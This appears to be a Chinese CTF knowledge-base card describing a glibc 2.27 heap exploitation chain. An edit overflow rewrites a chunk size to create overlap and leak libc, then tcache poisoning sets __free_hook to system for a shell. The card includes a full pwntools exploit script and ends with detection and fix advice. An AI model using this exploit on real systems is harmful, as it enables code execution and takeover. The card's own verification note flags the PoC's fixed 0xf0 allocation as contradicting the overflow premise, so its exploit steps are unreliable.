---
id: binary-pwn-heap-size-field-overlap-freehook-after-free-reuse
title: 无 UAF 的堆题：edit 溢出改写相邻块 size 造 chunk 重叠泄露 libc，再由二次释放同址把 free_hook 写成 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: heap-overflow-size-field-overlap-freehook-system
tags:
- pwn
- heap
- heap-overflow
- chunk-overlap
- unsorted-bin
- tcache
- free-hook
- glibc-2.27
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:51:26+08:00'
  notes: 已对照原文核对；本次核对未读取图片；edit 越界改相邻块 size 为 0x441→unsorted bin 泄 libc(0x3ebca0)→重铺后 tcache 投毒 __free_hook=system→free(/bin/sh) 的链与正文 exp 一致；但正文 exp 的 add() 把 Input size 硬编码成 0xf0，而 edit 只写 0x38+8 字节，按此无法越过 0xf0 块碰到下一个块头，「0x30 小块的 size 被改写」这一前提与卡内「add 固定申请 0xf0」自相矛盾，需按二进制实际分配逻辑核实后修正触发条件与利用步骤
url: /docs/binary/pwn/heap/binary-pwn-heap-size-field-overlap-freehook-after-free-reuse/
draft: false
kb_aliases:
- 无 UAF 堆溢出改 size
- chunk 重叠泄 libc
- 二次布局复用同一堆
- free_hook system
- 0x440 块重叠
---

## 一句话结论

菜单题里 `add` 固定申请 `0xf0`、`edit` 却按用户自报长度写入，于是可以越过 `0x30` 大小的块把下一个 `0x100` 块的 size 字段改成 `0x441`；放大后释放该块即落入 unsorted bin，再用一个同样起始地址的 `0x40` 块与之重叠、`show` 读出 `main_arena` 指针泄露 libc，最后重置堆布局、把 tcache fd 投毒到 `__free_hook`，写入 `system` 后 free 一个装 `/bin/sh` 的块即可 getshell——全程不需要 UAF。

## 原理

- **edit 长度不可控是唯一原语**：`add` 里 `size` 参数形同虚设（永远 `0xf0`），但 `edit(index, data)` 按 `read` 返回的字节数写入，且不校验是否超过该块原始大小 → 越界写相邻 chunk 头。
- **改 size 造重叠**：把第二个 `0x100` 块的 size 从 `0x101` 改为 `0x441`，`free` 时 glibc 按头部记录的大小把它挂进 unsorted bin（并吞并后续相邻空闲块）；此时该块覆盖范围远超原申请大小。
- **重叠读泄 libc**：紧接着申请一个 `0x40` 的块，其返回地址落在被吞并区域内，与原 `0x440` 块重叠；`show` 读该块即可读到 unsorted bin 残留的 `main_arena` 指针（本例偏移 `0x3ebca0`，glibc 2.27），减去即得 libc 基址。
- **tcache 投毒到 free_hook**：泄完 libc 后重新铺设堆（新申请一组 0x30/0xf0 块，避免污染旧布局），释放两个 `0x30` 块让 `0x40` 的 tcache 链表形成 `A←B`，再用一次越界写把 B 的 fd 改成 `__free_hook`；两次 `add` 后第二次返回 `__free_hook`，写入 `system`。
- **触发**：事先放一块内容为 `/bin/sh` 的块，把它 `free` 掉，`__free_hook(ptr)` 被调用 → `system("/bin/sh")`。
- 之所以不需要 UAF：所有读/写都发生在"仍然合法持有"的块上，靠的是**块大小被篡改后的地址重叠**，这也是它在 `delete` 会顺手置空的题目里仍然成立的原因。

## 触发条件

- glibc 保留 `__free_hook`（≤2.33；本例 2.27）。
- `edit` 的长度由用户/输入长度决定且不校验，可以覆盖到相邻 chunk 的 `size` 字段。
- 程序有 `show` 可读出重叠块内容；`add` 的尺寸固定或可选，能构造出与放大块重叠的小块。
- 已知 libc 版本或可先泄 libc（本例给出 `0x3ebca0` 偏移）。
- 有办法让某块内容为 `/bin/sh` 并在最后被 `free`。

## 利用步骤

1. 逆向菜单，确认 `add` 固定 `0xf0`、`edit` 按输入长度写、`show` 打印整块、`delete` 只 free 不置空（置空也不影响本链）。
2. 铺第一段布局：`add(0..6)`，`add(0)` 内容 `0x30` 字节，`add(2)` 起为 `0xf0`，`add(6)` 放 `/bin/sh`。
3. `edit(0, b'b'*0x38 + p64(0x441))`：从 `0x30` 块越界 `0x38+8` 字节，精确覆盖下一个块头的 size 为 `0x441`。
4. `delete(1)` 让被放大的块进 unsorted bin；立刻 `add(1, b'a'*0x38)` 拿回一个与它重叠的小块；`show(2)` 读出 6 字节指针，`libc_base = leak - 0x3ebca0`。
5. 重铺布局：重新 `add(0..5)`（0x30 与 0xf0 交替），`delete(1)`、`delete(3)` 形成 0x40 tcache 链。
6. `edit(2, b'z'*0x38 + p64(0x41) + p64(free_hook))`：再次越界，把空闲块的 fd 指向 `__free_hook`。
7. `add(6, b'/bin/sh')`、两次 `add` 拿回链上块，`edit` 把 `__free_hook` 写成 `system`；`delete(6)` 触发 `system("/bin/sh")`。

## PoC

```python
from pwn import *
context(os='linux', arch='amd64', log_level='info')
p = process('./pwn')
libc = ELF('./libc.so.6')
elf = ELF('./pwn')

def menu(i):  p.sendlineafter(b'4.show', str(i).encode())
def add(i, data, size=0xf0):
    menu(1); p.sendlineafter(b'Input index: ', str(i).encode())
    p.sendlineafter(b'Input size: ', str(size).encode())
    p.sendafter(b'Input note: ', data)
def dele(i):  menu(2); p.sendlineafter(b'Input index: ', str(i).encode())
def edit(i, data):
    menu(3); p.sendlineafter(b'Input index: ', str(i).encode())
    p.sendafter(b'Input note: ', data)
def show(i):  menu(4); p.sendlineafter(b'Input index: ', str(i).encode())

for i in range(7):
    add(i, b'/bin/sh\x00' if i == 6 else b'a'*0x30)
edit(0, b'b'*0x38 + p64(0x441))      # 越界改相邻块 size
dele(1)
add(1, b'a'*0x38)                    # 与原 0x440 块重叠
show(2)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3ebca0
free_hook, system = libc_base + libc.sym['__free_hook'], libc_base + libc.sym['system']

add(0, b'a'*0x30); add(1, b'b'*0x30); add(2, b'c'*0x30); add(3, b'd'*0x30)
add(4, b'e'*0xf0); add(5, b'f'*0xf0)
dele(1); dele(3)
edit(2, b'z'*0x38 + p64(0x41) + p64(free_hook))   # tcache fd 投毒
add(6, b'/bin/sh\x00'); add(7, b'a'*0x30); add(8, b'a'*0x30)
edit(7, p64(system)); edit(8, p64(system))
dele(6)                              # free("/bin/sh") -> system("/bin/sh")
p.interactive()
```

## 变体与关联

- 变体：改小 size 造「前向重叠」可与后一块合并；改大并配合 `prev_size` 可伪造 unlink（需绕过 `prev_size`/`size` 一致性校验）。
- 变体：glibc 2.32+ 有 safe-linking，投毒前要先泄堆地址并把 `fd >> 12` 异或回去；2.34+ 无 `__free_hook`，改打 `_IO_list_all`/`setcontext`/`__exit_funcs`。
- 关联：[[binary-pwn-heap-calloc-tcache-overlap-realloc-hook-onegadget]]（同为「改 size 造重叠 + tcache 投毒 hook」，但那边 add 用 calloc 且打 `__malloc_hook`/`__realloc_hook` + one_gadget）、[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]]（多了 UAF 原语、先泄 unsorted 再投毒）、[[binary-pwn-heap-glibc231-tcache-key-clear-repeated-free-freehook]]（重复 free 版投毒）。
- 边界：`edit` 若校验长度、或 `add` 尺寸完全不可控到无法构造重叠小块，则该链不成立；`show` 被去掉时需要改走 `_IO_2_1_stdout_` 泄露。

## 检测与防御

- 检测（CTF/审计）：`edit` 使用 `read` 返回值而不是记录块大小作为写入长度；`size` 参数被忽略（固定分配）；`show` 对已 `free` 或重叠块仍可打印。
- 修复：为每个块记录分配长度并在 `edit`/`show` 中强制校验；`free` 后置空指针并移除索引；开启 tcache 检测与 `MALLOC_CHECK_`。
- 加固：Full RELRO + PIE + 高版本 glibc（≥2.34 移除 hook）、开启 safe-linking 与 `glibc.malloc.tcache_count=0` 调试。
